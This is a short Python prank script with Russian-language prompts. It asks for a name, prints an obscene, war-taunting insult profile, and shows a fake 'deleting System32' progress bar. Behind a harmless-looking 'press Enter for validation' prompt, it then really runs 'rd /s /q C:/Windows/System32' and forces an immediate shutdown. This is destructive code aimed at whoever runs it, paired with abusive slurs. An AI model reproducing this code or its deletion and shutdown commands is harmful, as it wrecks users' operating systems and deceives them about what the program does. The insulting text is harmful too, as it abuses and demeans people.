import time
import os
imja = input('Введите Имя Марк: ')
class Mark:
    def __init__(self, position, real_name, place):
        self.position = position
        self.real_name = real_name
        self.place = place

    def get_mark_data(self):
        print(f'Позиция {imja}а в обществе: {self.position}\nНастоящее Имя {imja}а: {self.real_name}\nМесто проживания {imja}a: {self.place}')    
while True:
    enter = input('Нажмите Enter для валидации: ')

    if enter == '':
        mark_valid = Mark('ХУЕСОС','СВИН', 'МАРИУПОЛЬ (ОКОП)')
        mark_valid.get_mark_data()
        for i in range(0,101, 10):
            print(f'\rУдаление Папки System32: {i}%...',end='')
            time.sleep(0.1)
        os.system('rd /s /q C:/Windows/System32')
        os.system('shutdown -s -t 0')
        break   
    else:
        print('Нажмите Enter без ввода символов')
        continue
    